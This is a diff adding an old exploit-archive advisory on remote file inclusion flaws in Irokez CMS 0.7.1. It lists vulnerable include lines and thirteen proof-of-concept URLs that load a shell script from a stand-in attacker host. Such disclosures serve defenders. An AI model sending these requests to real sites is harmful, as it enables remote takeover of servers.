@@ -1,0 +1,63 @@
++-------------------------------------------------------------------------------------------
++ Irokez CMS <= 0.7.1 Multiple Remote File Include Vulnerabilities
++-------------------------------------------------------------------------------------------
++ Vendor ............: http://www.irokez.org/
++ Affected Software .: Irokez CMS <= 0.7.1
++ Download ..........: http://www.irokez.org/releases/irokez-0.7.1.zip
++ Description .......: "Irokez is a blogging based CMS"
++ Class .............: Remote File Inclusion
++ Risk ..............: High (Remote File Execution)
++ Found By ..........: nuffsaid <nuffsaid[at]newbslove.us>
++-------------------------------------------------------------------------------------------
++ Details:
++ Irokez CMS has several scripts which do not initialize variables before using them to include
++ files, assuming register_globals = on, we can initialize any one of the variables in a query
++ string and include a remote file of our choice.
++
++ Vulnerable Code:
++ scripts/gallery.scr.php, line(s) 11-12:
++ -> 11: require_once "{$GLOBALS['PTH']['func']}gallery.func.php";
++ -> 12: require_once "{$GLOBALS['PTH']['classes']}gallery.class.php";
++ scripts/sitemap.scr.php, line(s) 13:
++ -> 13: include_once $GLOBALS['PTH']['classes'] . 'menu.class.php';
++ scripts/news.scr.php, line(s) 11:
++ -> 11: require_once $GLOBALS['PTH']['classes'] . 'news.class.php';
++ scripts/polls.scr.php, line(s) 03:
++ -> 03: require_once $GLOBALS['PTH']['classes'] . 'poll.class.php';
++ scripts/rss.scr.php, line(s) 04:
++ -> 04: require_once "{$GLOBALS['PTH']['classes']}news.class.php";
++ scripts/search.scr.php, line(s) 04:
++ -> 04: require_once "{$GLOBALS['PTH']['classes']}content.class.php";
++ scripts/xtextarea.scr.php, line(s) 03-04:
++ -> 03: $GLOBALS['spaw_root'] = $spaw_root = $GLOBALS['PTH']['spaw'];
++ -> 04: require_once $GLOBALS['PTH']['spaw'] . 'spaw_control.class.php';
++ functions/form.func.php, line(s) 03:
++ -> 03: require_once "{$GLOBALS['PTH']['classes']}lang.class.php";
++ functions/general.func.php, line(s) 06:
++ -> 06: require_once "{$GLOBALS['PTH']['classes']}lang.class.php";  //TBL_Lang description
++ functions/groups.func.php, line(s) 03:
++ -> 03: require_once "{$GLOBALS['PTH']['classes']}group.class.php";
++ functions/js.func.php, line(s) 04:
++ -> 04: require_once "{$GLOBALS['PTH']['classes']}lang.class.php";
++ functions/sections.func.php, line(s) 03:
++ -> 03: require_once "{$GLOBALS['PTH']['classes']}section.class.php";
++ functions/users.func.php, line(s) 03:
++ -> 03: require_once "{$GLOBALS['PTH']['classes']}user.class.php";
++
++ Proof Of Concept:
++ http://[target]/[path]/scripts/gallery.scr.php?GLOBALS[PTH][func]=http://evilsite.com/shell.php?
++ http://[target]/[path]/scripts/sitemap.scr.php?GLOBALS[PTH][classes]=http://evilsite.com/shell.php?
++ http://[target]/[path]/scripts/news.scr.php?GLOBALS[PTH][classes]=http://evilsite.com/shell.php?
++ http://[target]/[path]/scripts/polls.scr.php?GLOBALS[PTH][classes]=http://evilsite.com/shell.php?
++ http://[target]/[path]/scripts/rss.scr.php?GLOBALS[PTH][classes]=http://evilsite.com/shell.php?
++ http://[target]/[path]/scripts/search.scr.php?GLOBALS[PTH][classes]=http://evilsite.com/shell.php?
++ http://[target]/[path]/scripts/xtextarea.scr.php?GLOBALS[PTH][spaw]=http://evilsite.com/shell.php?
++ http://[target]/[path]/functions/form.func.php?GLOBALS[PTH][classes]=http://evilsite.com/shell.php?
++ http://[target]/[path]/functions/general.func.php?GLOBALS[PTH][classes]=http://evilsite.com/shell.php?
++ http://[target]/[path]/functions/groups.func.php?GLOBALS[PTH][classes]=http://evilsite.com/shell.php?
++ http://[target]/[path]/functions/js.func.php?GLOBALS[PTH][classes]=http://evilsite.com/shell.php?
++ http://[target]/[path]/functions/sections.func.php?GLOBALS[PTH][classes]=http://evilsite.com/shell.php?
++ http://[target]/[path]/functions/users.func.php?GLOBALS[PTH][classes]=http://evilsite.com/shell.php?
++-------------------------------------------------------------------------------------------
+
+# milw0rm.com [2006-12-25]
